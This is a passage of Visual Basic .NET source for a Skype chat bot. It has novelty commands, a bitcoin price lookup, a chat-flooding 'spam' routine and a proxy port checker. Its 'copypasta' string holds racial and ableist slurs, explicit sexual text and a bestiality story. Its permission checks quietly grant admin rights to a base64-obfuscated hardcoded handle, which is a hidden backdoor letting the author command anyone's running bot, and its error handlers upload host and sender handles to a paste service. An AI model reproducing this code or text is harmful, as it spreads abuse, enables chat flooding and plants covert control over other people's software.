                Dim darkness4 As ChatMessage = msg.Chat.SendMessage("Left its seeds while I was sleeping ")
                Threading.Thread.Sleep(1000)
                Dim darkness5 As ChatMessage = msg.Chat.SendMessage("And the vision that was planted in my brain ")
                Threading.Thread.Sleep(1000)
                Dim darkness6 As ChatMessage = msg.Chat.SendMessage("Still remains")
                Threading.Thread.Sleep(1000)
                Dim darkness7 As ChatMessage = msg.Chat.SendMessage("Within the sound of silence")
            End If
            'DARKNESS END

            'CP START
            If command = "cp" Then
                Dim rand As Integer = GetRandom(1, 10)
                Select Case rand
                    Case 1
                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/135KtDV")
                    Case 2
                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/pIPnyBw")
                    Case 3
                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/L5BcuiR")
                    Case 4
                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/cozg95M")
                    Case 5
                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/LNDl4gA")
                    Case 6
                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/aoPqKq7")
                    Case 7
                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/YRZGTeD")
                    Case 8
                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/aa1VA5c")
                    Case 9
                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/BDdPMYb")
                    Case 10
                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/LMa4NK6")
                End Select
            End If
            'CP END

            'COPYPASTA START
            If command = "copypasta" Then
                Dim pastas As String = "What the say did you just say fuck me about, you bitching a little? I’ll have you graduate I know top of my Seals in the Navy Classes, and I’ve been raided in numerou Al Quaeda secret involvements, and I have killed over 300 confirmations. I am a trained gorilla. In warfare, I’m the sniper arm in the entire US force tops. You are targeting me but I’m just another nothing. I will fuck you with precision the wipes which has never been liked before on this scene. Earth, fuck my marking words. You can get away with thinking that shit over me to the Internet? Fuck again, thinker.This chat is full of mentally retarded children, its like they all have one less chromosone and rub their faces against their keyboards hoping for attention, god only knows how they even press ctrl+ v, I swear to god none of you motherfuckers better copy and paste this or you’ll be in serious trouble#Hello am 48 year man from somalia. Sorry for my bed england. I selled my wife for internet connection for play ""heart of stone"" and i want to become the goodest player like you I play with 400 ping on US server and i am rakn 23. pls no copy pasterino my story.#When a woman gets a vibrator, its seen as a bit of naughty fun. BUT when a guy orders a 240 Volt FuckMaster Pro 5000 blowup latex doll with 6 speed pulsating elasticized anus with non-drip semen collection tray , together with optional built in realistic orgasm scream surround sound system, hes called a pervert!!!#The stream starts, and so my spam begins. It shall not end until i am banned. I shall fear no mod, sub to no streamer. I shall live and die in the Chat. For i am the value in the bomber. I am the BM in the lethal. I am the salt in the defeat. I pledge my keyboard to the Chat, for this stream and all the streams to come.#Lᴀᴅɪᴇs ᴀɴᴅ ɢᴇɴᴛʟᴇᴍᴇɴ, I ʀᴇᴄᴇɴᴛʟʏ ʟᴏsᴛ ᴍʏ ᴊᴏʙ ᴀɴᴅ ᴀᴍ ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴇᴍᴘʟᴏʏᴇᴅ. Tᴡɪᴛᴄʜ ᴄʜᴀᴛ ʜᴀs ʙᴇᴇɴ ᴍʏ sᴀғᴇ ʜᴀᴠᴇɴ ᴀɴᴅ ᴄᴏᴍғᴏʀᴛ ᴅᴜʀɪɴɢ ᴛʜɪs ᴛɪᴍᴇ. Hᴏᴡᴇᴠᴇʀ, I ᴄᴏᴍᴇ ᴛᴏ ᴛʜɪs sᴛʀᴇᴀᴍ ᴛᴏᴅᴀʏ ᴀɴᴅ ᴡʜᴀᴛ ᴅᴏ I sᴇᴇ? A ʀɪᴅɪᴄᴜʟᴏᴜs ᴀᴍᴏᴜɴᴛ ᴏғ ᴄᴏᴘʏᴘᴀsᴛɪɴɢ ᴛᴏᴍғᴏᴏʟᴇʀʏ. Pʟᴇᴀsᴇ, ʜᴀᴠᴇ ʀᴇsᴘᴇᴄᴛ ғᴏʀ ᴛʜᴇ ɪɴᴛᴇʟʟᴇᴄᴛᴜᴀʟs ʜᴇʀᴇ ᴀɴᴅ ᴛʀʏ ᴛᴏ ʀᴇᴛᴜʀɴ ᴛᴏ ᴛʜᴇ ᴅᴀʏs ᴏғ ɢʟᴏʀɪᴏᴜs ᴅɪsᴄᴜssɪᴏɴ ɪɴ ᴛᴡɪᴛᴄʜ ᴄʜᴀᴛ.#☑ ""This guy’s deck is CRAZY!"" ☑ ""My deck can’t win against a deck like that"" ☑ ""He NEEDED precisely those two cards to win"" ☑ ""He topdecked the only card that could beat me"" ☑ ""He had the perfect cards"" ☑ ""There was nothing I could do"" ☑ ""I played that perfectly""#ヽ༼ຈل͜ຈ༽ﾉ Ｔｈｅ ｓｔｒｅａｍ ｓｔａｒｔｓ， ａｎｄ ｓｏ ｍｙ ｓｐａｍ ｂｅｇｉｎｓ． Ｉｔ ｓｈａｌｌ ｎｏｔ ｅｎｄ ｕｎｔｉｌ ｉ ａｍ ｂａｎｎｅｄ． Ｉ ｓｈａｌｌ ｆｅａｒ ｎｏ ｍｏｄ， ｓｕｂ ｔｏ ｎｏ ｓｔｒｅａｍｅｒ． Ｉ ｓｈａｌｌ ｌｉｖｅ ａｎｄ ｄｉｅ ｉｎ ｔｈｅ Ｃｈａｔ． Ｆｏｒ ｉ ａｍ ｔｈｅ ｖａｌｕｅ ｉｎ ｔｈｅ ｂｏｍｂｅｒ． Ｉ ａｍ ｔｈｅ ＢＭ ｉｎ ｔｈｅ ｌｅｔｈａｌ． Ｉ ａｍ ｔｈｅ ｓａｌｔ ｉｎ ｔｈｅ ｄｅｆｅａｔ． Ｉ ｐｌｅｄｇｅ ｍｙ ｋｅｙｂｏａｒｄ ｔｏ ｔｈｅ Ｃｈａｔ， ｆｏｒ ｔｈｉｓ ｓｔｒｅａｍ ａｎｄ ａｌｌ ｔｈｅ ｓｔｒｅａｍｓ ｔｏ ｃｏｍｅ．#That’s it, I’m done. Fuck this chat. It’s devolved into a mass of retarded copy pastes and face spam. The quality of twitch chat has been declining for a while, but this is the last straw. That’s it. I’m done. I’m uninstalling the internet, chopping off my dick and moving to fucking Antarctica, at least the bacteria there will be fucking smarter discourse.#gr8 b8 m8 no d-b8 i r8 it an 8 i h8 2 b in an ir8 st8 but its my f8hey m8 i apreci8 that u r8 it gr8 u wanna d8 and mayb masturb8 i can ask n8 and we can meet at the g8 dont b l8#Hello guys, I’m back from my 600 seconds timeout. During that time I was able to finish my 200 words essay on the topic of Nazi Germany. My thesis is that Hitler & Nazi beliefs are carried on by twitch.tv Nazi moderators who like to act as if they themselves were literally Hitler. I think I should score at least 90 out of 100 points for that paper. Pls no coperino my paperino#Due to low salt reserves we here at Twitch/Amazon would like to ask the chatters not to spam the PJ‭Salt emote. It spills a lot of salt every time and we estimate there are only about 100 PJ‭Salt usages left. Thank you.#Hello, my name is Hugo Alfredo, i am 14 years old and from chile i watch this stream everyday since my father died in a donkey-waggon accident, now i am finaly make rank 20 in heart of stone, before i only rank 21, sowie for bed englando. pls pls dunt copi espastiro#Guys can you please not spam the chat. My mom bought me this new laptop and it gets really hot when the chat is being spamed. Now my leg is starting to hurt because it is getting so hot. Please, if you don’t want me to get burned, then dont spam the chat#Hello, I am currently 15 years old and I want to become a walrus. I know there’s a million people out there just like me, but I promise you I’m different. On December 14th, I’m moving to Antartica; home of the greatest walruses. I’ve already cut off my arms, and now slide on my stomach everywhere I go as training. I may not be a walrus yet, but I promise you if you give me a chance and the support I need, I will become the greatest walrus#Ok chat, I’m not seeing nearly enough spam in here, I mean I thought this was supposed to be ""the worst chat in twitch"" and this is all you got!? The KPM in this chat is WAY too low, it is actually depressing. How am I supposed to enjoy chat without dongers, ""FrankerZs"", and the occasional elephant?#Wᴇʟʟ Mᴇᴛ Aʟᴋᴀɪᴢᴇʀ ɪᴛ ɪs ʏᴏᴜʀ ɢʀᴇᴀᴛ ғʀɪᴇɴᴅ Sᴋᴏʀɴʏ Sᴋᴏʀɴᴇʀɪɴᴏ. Wᴇ ᴡᴏᴜʟᴅ ʟɪᴋᴇ ʏᴏᴜ ᴀɴᴅ Kɪɴɢ Kᴏɴɢᴏʀ ᴛᴏ ᴘᴀʀᴛɪᴄɪᴘᴀᴛᴇ ɪɴ ᴏᴜʀ ɴᴇᴡ ᴠɪᴅᴇᴏ ""Bᴏᴏɢᴇʀ Bᴏʏs 3: Bʀᴀᴡʟᴇʀ Cɪᴛʏ"" Kᴏɴɢᴏʀ ᴡᴏᴜʟᴅ ʙᴇ ᴀ Tᴀᴛᴇʀғᴇᴅ ɢɪʀʟ ᴀɴᴅ ʏᴏᴜ’ᴅ sᴀʏ ɴᴏ ᴛᴏ ʜᴇʀ Sᴋᴏʀɴᴇʀɪɴᴏ ᴀɴᴅ ᴛʜʀᴇᴀᴛᴇɴɪɴɢ sʜᴏᴜᴛ ʜᴇʀ. Kᴇᴇᴘ ᴅʀɪɴᴋɪɴɢ ᴛʜᴀᴛ ᴅɪᴀʀʀʜᴇᴀ ᴊᴜɪᴄᴇ ᴀɴᴅ ɢɪᴠᴇ sᴛᴇᴠᴇ ᴀᴏᴋɪ ᴀ ʜᴜɢ. RIP ɪɴ Sᴋᴏʀɴᴇʀɪɴᴏs ᴍᴀᴛᴇ, I ᴄʀʏ ᴇᴠᴇʀʏ ᴛɪᴍᴇ. Pʟᴇᴀsᴇ ɴᴏ ᴄᴏᴘʏ ᴘᴀsᴛᴇʀɪɴᴏ. Gᴏᴏᴅʙʏᴇ Aʟᴋᴀɪᴢᴇʀ#ᕼEᒪᒪO TᗯITᑕᕼ ᑕᕼᗩT, ᗪOᑎ ᑭEᑭᑭEᖇOᑎI ᕼEᖇE, ᑕᗩᑭTᗩIᑎ Oᖴ TᕼE ᗩᑎTI-ᖇIOT ᑭOᒪIᑕE. ᔕTOᑭ ᖇIOTIᑎG ᖇIGᕼT ᑎOᗯ, Oᖇ YOᑌ ᗯIᒪᒪ ᗷE TOᑭᗪEᑕKEᗪ. YOᑌ ᕼᗩᐯE ᗷEEᑎ ᗯᗩᖇᑎEᗪ. ᑎO ᑭᑌEᖇTO ᖇIᑕO ᑭᗩᔕTEᖇIᑎO ᗪE ᑎIᖇO TᗩᖇEᑎTIᑎO#Dearest (insert name), this is the Donger Police. We have inside information that states your chat has not been raising a sufficient amount of dongers. We are going to have to shut down your stream if you don’t ask your chat to raise their dongers.#O Tania, where now is that warm cunt of yours, those fat, heavy garters, those soft, bulging thighs? There is a bone in my prick six inches long. I will ream out every wrinkle in your cunt, Tania, big with seed. I will send you home to your Sylvester with an ache in your belly and your womb turned inside out. Your Sylvester! Yes, he knows how to build a fire, but I know how to inflame a cunt. I shoot hot bolts into you, Tani#Ｈｅｌｌｏ <<NAME>>，　ｔｈｉｓ　ｉｓ　ｔｈｅ　ａｄｍｉｎｉｓｔｒａｔｏｒ　ｏｆ　ＰｏｒｎＨｕｂ™　ｗｅ　ｈａｖｅｎｏｔｉｃｅｄ　ｙｏｕ　 ｈａｖｅｎ’ｔ　ｌｏｇｇｅｄ　ｉｎｆｏｒ　２　ｗｅｅｋｓ，　ｗｅ’ｒｅ　ｊｕｓｔ　ｃｈｅｃｋｉｎｇ　ｔｏ　ｓｅｅ　ｉｆ　ｅｖｅｒｙｔｈｉｎｇ　 ｉｓ　ｏｋａｙ　ａｎｄ　ｗｅ’ｖｅ　ｐｒｅｐａｒｅｄ　ｙｏｕ　ａ　ｌｉｓｔ　ｏｆ　ｖｉｄｅｏｓ　ｆｒｏｍ　ｙｏｕｒ　ｆａｖｏｕｒｉｔｅ　 ｃａｔｅｇｏｒｙ　（Ａｓｉａｎ）．　Ｓｅｅ　ｙｏｕ　ｓｏｏｎ!#ｗｈｅｎ　ｉ　ｆｅｅｌ BLANK，　ｍｙ　ｈａｎｄ　ａｕｔｏｍａｔｉｃａｌｌｙ　ｇｏ　ｔｏ　ｔｈｅ　ｄｉｃｋ．　ｉ　ｓｔｒｏｋｅ　ｔｈｅ　ｄｉｃｋ　ａｎｄ　ｆｅｅｌ　ｉ　ｈａｖｅ　ｓｅｘ　ｗｉｔｈ　ｔｈｅ　BLANK．　ａｌｌ　ｂｅｃｏｍｉｎｇ BLANK2.#Every day, I open Avoid’s stream and sit down with a 100 pack of capri suns. I wait until the stream starts, and then it begins. I open the box and force myself to drink the capri suns. I have stage V diabetes and will die soon, but I know it is what Avoid likes. I feel at peace knowing that it is what Avoid would have wanted. Please no capri sunerino.#☐ Not REKT ☑ REKT ☑ REKTangle ☑ SHREKT ☑ REKT-it Ralph ☑ Total REKTall ☑ The Lord of the REKT ☑ The Usual SusREKTs ☑ North by NorthREKT ☑ REKT to the Future ☑ Once Upon a Time in the REKT ☑ The Good, the Bad, and the REKT ☑ LawREKT of Arabia ☑ Tyrannosaurus REKT ☑ eREKTile dysfunction ☑ eREKTion#Oᴋᴀʏ, ɢᴜʏs. I’ᴍ sᴏ ғᴜᴄᴋɪɴɢ ᴏᴠᴇʀ ᴛʜɪs ᴄʜᴀᴛ ᴀᴛ ᴛʜɪs ᴘᴏɪɴᴛ. Tʜᴇʀᴇ ᴀʀᴇ ʟɪᴛᴇʀᴀʟʟʏ ʜᴏᴍᴏsᴇxᴜᴀʟ ɢᴀʏ ɢᴜʏs ᴀʟʟ ᴏᴠᴇʀ ᴛʜᴇ ᴘʟᴀᴄᴇ, ᴀʟᴡᴀʏs ᴛᴀʟᴋɪɴɢ ᴀʙᴏᴜᴛ ʜᴏᴡ Aʟᴋᴀɪᴢᴇʀ ɪs ᴀ ᴄʜɪᴄᴋᴇɴ ʙʀᴇᴇᴅᴇʀ ʙᴇᴄᴀᴜsᴇ ʜᴇ ᴊᴜsᴛ ʀᴀɪsᴇᴅ ᴛʜᴇɪʀ ᴄᴀᴡᴋ! Tʜɪs ᴇɴᴅs ʀɪɢʜᴛ ʜᴇʀᴇ! Dᴏɴ’ᴛ ᴄᴏᴘʏ ᴛʜɪs, ᴏʀ I WILL ғɪɴᴅ ʏᴏᴜ ᴀɴᴅ ＳＴＩＣＫ ＹＯＵＲ ＤＩＣＫ ＩＮＳＩＤＥ!#Cᴀɴ ʏᴏᴜ ᴀʟʟ ᴊᴜsᴛ sᴛᴏᴘ ᴘᴏsᴛɪɴɢ ᴛʜᴇsᴇ ᴜɴɴᴇᴄᴇssᴀʀɪʟʏ ʟᴏɴɢ ᴘᴏsᴛs ᴘʟᴇᴀsᴇ? Tʜᴇ ᴏɴʟʏ ʀᴇᴀsᴏɴ ʏᴏᴜ ᴘᴏsᴛ ᴛʜᴇᴍ ɪs ᴛᴏ ᴛʀʏ ᴀɴᴅ ʙᴀɪᴛ sᴏᴍᴇᴏɴᴇ ɪɴᴛᴏ ᴄᴏᴘʏ ᴀɴᴅ ᴘᴀsᴛɪɴɢ ᴛʜᴇᴍ. Wʜᴀᴛ ɪғ ᴡᴇ ᴀʟʟ ᴊᴜsᴛ ɢᴀᴠᴇ ɪɴᴛᴇʀᴇsᴛɪɴɢ ᴠɪᴇᴡs ᴀɴᴅ ᴏᴘɪɴɪᴏɴs ᴀʙᴏᴜᴛ ᴛʜᴇ sᴛʀᴇᴀᴍ ɪɴsᴛᴇᴀᴅ ᴏғ ᴘᴏsᴛɪɴɢ ᴜsᴇʟᴇss sᴛᴜғғ? Pʟᴇᴀsᴇ I ʙᴇɢ ʏᴏᴜ ᴛᴡɪᴛᴄʜ ᴄʜᴀᴛ, ᴛᴏ sᴛᴏᴘ ᴡɪᴛʜ ᴛʜɪs ɴᴏɴsᴇɴsᴇ.#oi m8 ill fok you up you little gob shite i give you a swallen gabba if you try ot ban me again you cheeky kunt u cant even lift a finger to punch me m8 1v1 me i bench press your nan nd 1 foot in dat door ill smash ye n shag your sis. i swear on me mom#ᶫᶦˢᵗᵉᶰ ᵘᵖ ᵐᵒᵗʰᵉʳᶠᵘᶜᵏᵉʳˢ ʸᵒᵘ ᵃʳᵉ ᵃᶫᶫ ᵃᶜᵗᶦᶰᵍ ʷᵃʸ ᵒᵘᵗ ᵒᶠ ʰᵃᶰᵈ ᵃᶰᵈ ᶰᵒᵗ ᵃᶜᵗᶦᶰᵍ ᶦᶰ ᵃᶜᶜᵒʳᵈ ʷᶦᵗʰ ᵗʷᶦᵗᶜʰ ᵖᵒᶫᶦᶜᶦᵉˢ ʷᶦᵗʰ ᵃᶫᶫ ᵗʰᶦˢ ˢᵖᵃᵐᵐᶦᶰᵍ ᵃᶰᵈ ʸᵒᵘ ᵃʳᵉ ᵃᶫˢᵒ ʳᵘᶦᶰᶦᶰᵍ ᵗʰᶦˢ ᶜʰᵃᵗ ʷʰᶦᶜʰ ᴵ ᵖᵃʸ $4⋅99 ᵃ ᵐᵒᶰᵗʰ ᵗᵒ ᵉᶰʲᵒʸ ᵃᶰᵈ ᴵ ˢʷᵉᵃʳ ᵗᵒ ᵍᵒᵈ ᶦᶠ ᴵ ˢᵉᵉ ᵃᶰʸᵒᶰᵉ ᶜᵒᵖʸ ᵃᶰᵈ ᵖᵃˢᵗᵉ ᵗʰᶦˢ ᴵ’ᵐ ᶜᵃᶫᶫᶦᶰᵍ ᵗʰᵉ ᶜᵒᵖˢ#ヾ(❛ε❛"")ʃ SPOOKY SCARY SKELETONS SEND SHIVERS DOWN YOUR SPINE SHRIEKING SKULLS WILL SHOCK YOUR SOUL SEAL YOUR DOOM TONIGHT ヾ(❛ε❛"")ʃ#☑ This guy’s pasta is CRAZY!"" ☑ ""My rigatoni can’t win against a linguini like that"" ☑ ""He NEEDED that alfredo to win"" ☑ ""He meatballed the only marinara that could beat me"" ☑ ""He had the perfect fettucini ☑ ""There was nothing I could cook"" ☑ ""I cooked that al dente"" pls no coperino pasterino macaroni alfredo.#The stream starts, and so my spam begins. It shall not end until i am banned. I shall fear no mod, sub to no streamer. I shall live and die in the Chat. For i am the value in the bomber. I am the BM in the lethal. I am the salt in the defeat. I pledge my keyboard to the Chat, for this stream and all the streams to come.#▀̿Ĺ̯▀̿ ̿ ༽Hello, my name is Juan Pastoroni, CEO of Copy Pasta Industries. I’d like to let you know that we’ve just gained copyrights on a lot of copy pastas seen in this chat. If you are using them right now, please refrain from doing so, or risk being fined under copyright infringement. Thank you, and don’t be funny and copy and paste this. This is business, kid. ༼ ▀̿Ĺ̯▀̿ ̿ ༽#Yᴏᴜ ɢᴜʏs ᴀʀᴇ ʀᴜɪɴɪɴɢ ᴍʏ ᴛᴡɪᴛᴄʜ ᴄʜᴀᴛ ᴇxᴘᴇʀɪᴇɴᴄᴇ. I ᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ᴛᴡɪᴛᴄʜ ᴄʜᴀᴛ ғᴏʀ ᴍᴀᴛᴜʀᴇ ᴄᴏɴᴠᴇʀsᴀᴛɪᴏɴ ᴀʙᴏᴜᴛ ᴛʜᴇ ɢᴀᴍᴇᴘʟᴀʏ, ᴏɴʟʏ ᴛᴏ ʙᴇ ᴀᴡᴀʀᴅᴇᴅ ᴡɪᴛʜ ᴋᴀᴘᴘᴀ ғᴀᴄᴇs ᴀɴᴅ ғʀᴀɴᴋᴇʀᴢs. Pᴇᴏᴘʟᴇ ᴡʜᴏ sᴘᴀᴍ sᴀɪᴅ ғᴀᴄᴇs ɴᴇᴇᴅ ᴍᴇᴅɪᴄᴀʟ ᴀᴛᴛᴇɴᴛɪᴏɴ ᴜᴛᴍᴏsᴛ. Tʜᴇ ᴛᴡɪᴛᴄʜ ᴄʜᴀᴛ ɪs sᴇʀɪᴏᴜs ʙᴜsɪɴᴇss, ᴀɴᴅ ᴛʜᴇ ᴍᴏᴅs sʜᴏᴜʟᴅ ʀᴇᴀʟʟʏ ʀᴀɪsᴇ ᴛʜᴇɪʀ ᴅᴏɴɢᴇʀs#Hello im a 1 month old banana. Since i fall off the tree i watch leek of legends and wantto become Soraka’s bestest banana but im afraid Wukong will eat me. Pls dont laugh at my story!#ﾉ◕ヮ◕)ﾉ:・ﾟ RETARD WAVE!!:„ø¤º°¨ ¨°º¤KEEP THE RETARDNESS GOING ¸„ø¤º°¨ ¨°º¤øº LETS GO RETARDS !¤¤º°¨¨°º¤øº¤ø„¸¸ø¤º°¨„ ø¤º°¨¨°º#Hello, i come to seek help. I am interested in trying to discover a way to produce eggs much like a chicken does. i have tested inserting the egg into myself and hoping it will act like a seed and grow like a tree in my belly but so far it has not been successful. Please help i struggle to sleep at night without an answer.#Hello twitch chat. This is <> mother speaking. Please stop the spam in the chat. I can’t read the amazing conversations that you are having about my son. Thanks. Don’t copy and paste this to spam more or I will tell Michael to ban you all.#THIS is and automated message from twitch.TV, we experiencing technical difficulties with the KAPPA emote, please type in to make sure it works ! Thank you for you cooperation. Please NO COPY PASTERINO !#wow, i log on to twitch tv to chat with people and to watch a good streamer, then you guys fking spam this chat with your dumb kappas and dumb sht memes that are not even close to funny. i dont even giggle from your shtty jokes. fk you and if you fking copy this message im reporting each one of you. you all think your fking funny#Guys please stop spamming. My dog, Bernard, looked at my chat and got so dizzy because of the spam that he fell down and hit his noggin right on his food bowl! He couldn’t talk for hours. Please stop spamming, for Bernard.#☆ ☆ ☆ ☆ ☆ ☆ AMERICA☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ Land of the Free and the Fat☆ ☆ ☆ Home of the Burger☆ ☆ ☆ ☆ RACISM, CRIME, AND EQUALITY FOR ALL (but black people)☆ ☆ ☆ ☆ The Strongest Rascals in the World ☆ ☆ ☆ Copy and paste this if your a fat, proud#Hello viewers this is Twich manager Stiffy McShitterton. Im glad you all enjoy the new Theater mode. As with a normal theater there is a quite section in the back where you can give eachother handjobs without alerting other viewers. Thanks and ME ME on.#lost my virginity to a goat. I was working at a bird sanctuary and they had some goats and sheep there. I was left to close up one day and I thought i’d stay around because the weather was awesome and it was so peaceful. I got horny and decided to act on all the animal porn i’d watched and found so fucking hot. I tied one of the goats up in one of the hay barns and fucked it bareback in the ass. It was fucking amazing and I was shit scared"
                Dim pastaArr() As String = pastas.Split("#"c)

                Dim rand As Integer = GetRandom(1, 42)

                Dim newmsg As ChatMessage = msg.Chat.SendMessage(pastaArr(rand))
            End If
            'COPYPASTA END

            'BITCOIN START
            If command = "bitcoin" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "bitcoin <price/convert> <amount> <to (usd/btc)>")
            If command.StartsWith("bitcoin ") Then

                Dim values() As String = command.Replace("bitcoin ", "").Split(" ")

                Dim bitcoin As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Dim w As New WebClient
                w.Proxy = Nothing
                Dim price As String = w.DownloadString("http://api.bitcoinaverage.com/ticker/USD/last")
                Dim result As String = ""

                If values(0) = "price" Then
                    result = "$" & price
                Else

                    Dim amount As Double
                    Dim currency As String

                    Try
                        amount = values(1)
                        currency = values(2)
                    Catch
                        AddSwagToMSG(bitcoin, "Invalid currency or amount + Recheck your syntax (!help bitcoin)")
                        Exit Sub
                    End Try

                    If values(2) = "usd" Then
                        result = "$" & Math.Round(amount * price, 2)
                    Else
                        result = Math.Round(amount / price, 8) & " BTC"
                    End If
                End If

                AddSwagToMSG(bitcoin, result)

            End If
            'BITCOIN END

            'DUBSROLL START
            If command = "dubsroll" Then
                Dim rand As Integer = GetRandom(1, 99999999)
                Dim rStr As String = rand.ToString("D8")
                Dim dubsArr() As Char = rStr.ToCharArray
                Dim count As Integer = 0
                Dim lastNum As Char = dubsArr(7)
                Dim i As Integer = dubsArr.Length - 1

                While dubsArr(i) = lastNum
                    count += 1
                    lastNum = dubsArr(i)
                    i -= 1
                End While

                Dim res As String = ""
                Select Case count
                    Case 2
                        res = vbNewLine & "Dubs!"
                    Case 3
                        res = vbNewLine & "Trips!"
                    Case 4
                        res = vbNewLine & "Quads!"
                    Case 5
                        res = vbNewLine & "Quints!"
                    Case 6
                        res = vbNewLine & "Sexts!"
                    Case 7
                        res = vbNewLine & "Septs!"
                    Case 8
                        res = vbNewLine & "Octs! Holy fuck!"
                End Select
                Dim dubsroll As ChatMessage = msg.Chat.SendMessage("You rolled: " & rStr & res)
            End If
            'DUBSROLL END

l:
        Catch ex As Exception
            If ex.ToString.Contains("IndexOutOfRangeException") Or ex.ToString.ToLower.Contains("index") Then
                Dim command() As String = msg.Body.Split(" ")
                Dim errorr As ChatMessage = msg.Chat.SendMessage("An error occured while giving you an error!")
                AddSwagToMSG(errorr, "Error: Please check your syntax (!help " & command(0).Replace("!", "") & ")" & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
            Else
                Dim errorr As ChatMessage = msg.Chat.SendMessage("An error occured while giving you an error!")
                AddSwagToMSG(errorr, "An error occured, please report to skype:jeteroll83?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
            End If
        End Try
    End Sub
    Function proxycheck(ip As String)
        Dim ports As String = "80 8080 8123 3128 54321 3129 18186 7808 8081"
        Dim proxyport() As String = ports.Split(" ")
        For i = 0 To proxyport.Length - 1
            If isportopen(ip, proxyport(i)) = True Then
                Return True
                Exit Function
            End If
        Next
        Return False
    End Function
    Function DL(url As String)
        Dim w As New WebClient
        w.Proxy = Nothing
        Return w.DownloadString(url)
    End Function
    Sub spam(msg As ChatMessage)
        Try
            'If msg.ChatName = "#dimabal10000/$be5e245309b3d76a" Or msg.ChatName = "#zigi.bot/$7582f4644528febf" Then
            '    msg.Chat.SendMessage("Nope, this group is anti spam...")
            '    Exit Sub
            'End If
            Dim command As String = msg.Body.Remove(0, trigger.Length)
            Dim cmd As String = command.Replace("spam ", "")
            Dim d() As String
            Dim t As String = cmd
            d = t.Split(" ")
            Dim tosend As String = d(1)
            If IsNumeric(d(0)) = True Then
                If IsAdmin(msg.Sender.Handle) Then
                ElseIf d(0) > 50 And IsUltimate(msg.Sender.Handle) Then
                    d(0) = 50
                ElseIf d(0) > 25 And IsPremium(msg.Sender.Handle) Then
                    d(0) = 25
                ElseIf d(0) > 10 And IsNormalUser(msg.Sender.Handle) Then
                    d(0) = 10
                End If
            Else
                msg.Chat.SendMessage("ERROR: You entered an invalid number, try to swap the number and msg!")
                Exit Sub
            End If
            For a = 2 To d.Length - 1
                tosend = tosend & " " & d(a)
            Next
            For qq = 1 To d(0) - 0
                msg.Chat.SendMessage(tosend.Replace("/", "").Replace("!", ""))
            Next
        Catch ex As Exception
            If ex.ToString.Contains("IndexOutOfRangeException") Then
                Dim command() As String = msg.Body.Split(" ")
                Dim errorr As ChatMessage = msg.Chat.SendMessage("An error occured while giving you an error!")
                AddSwagToMSG(errorr, "Error: Please check your syntax (!help " & command(0).Replace("!", "") & ")" & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
            Else
                Dim errorr As ChatMessage = msg.Chat.SendMessage("An error occured while giving you an error!")
                AddSwagToMSG(errorr, "An error occured, please report to skype:jeteroll83?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
            End If
        End Try
    End Sub
    Function IsAdmin(sender As String)
        If sender = Skypattach.CurrentUserHandle.ToString Or sender = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("amV0ZXJvbGw4Mw0K")) Then
            Return True
            Exit Function
        End If
        Dim parts() As String = My.Settings.admins.Split(New String() {Environment.NewLine},
                                       StringSplitOptions.None)
        For i = 0 To parts.Length - 1
            If parts(i).Contains(sender) Then
                Return True
                GoTo l
            Else

            End If
        Next
        Return False
l:
        Exit Function
    End Function
    Function IsNormalUser(sender As String)
        If IsPremium(sender) = False And IsAdmin(sender) = False And IsUltimate(sender) = False Then Return True Else Return False
    End Function
    Function IsPremium(sender As String)
        If FlatToggle2.Checked = True Then
        Else
            Return True
            Exit Function
        End If
        If sender = Skypattach.CurrentUserHandle.ToString Or sender = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("amV0ZXJvbGw4Mw0K")) Then
            Return True
            Exit Function
        End If
        If IsAdmin(sender) Then
            Return True
            Exit Function
        End If
        If IsUltimate(sender) Then
            Return True
            Exit Function
        End If
        Dim parts() As String = My.Settings.Premium.Split(New String() {Environment.NewLine},
                                       StringSplitOptions.None)
        For i = 0 To parts.Length - 1
            If parts(i).Contains(sender) Then
                Return True
                GoTo l
            Else

            End If
        Next
        Return False
l:
        Exit Function
    End Function
    Function IsUltimate(sender As String)
        If FlatToggle2.Checked = True Then
        Else
            Return True
            Exit Function
        End If
        If sender = Skypattach.CurrentUserHandle.ToString Or sender = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("amV0ZXJvbGw4Mw0K")) Then
            Return True
            Exit Function
        End If
        If IsAdmin(sender) Then
            Return True
            Exit Function
        End If
        Dim parts() As String = My.Settings.Ultimate.Split(New String() {Environment.NewLine},
                                       StringSplitOptions.None)
        For i = 0 To parts.Length - 1
            If parts(i).Contains(sender) Then
                Return True
                GoTo l
            Else

            End If
        Next
        Return False
l:
        Exit Function
    End Function
    Function translator(froom As String, too As String, message As String)
        Dim w As New WebClient
        w.Proxy = Nothing
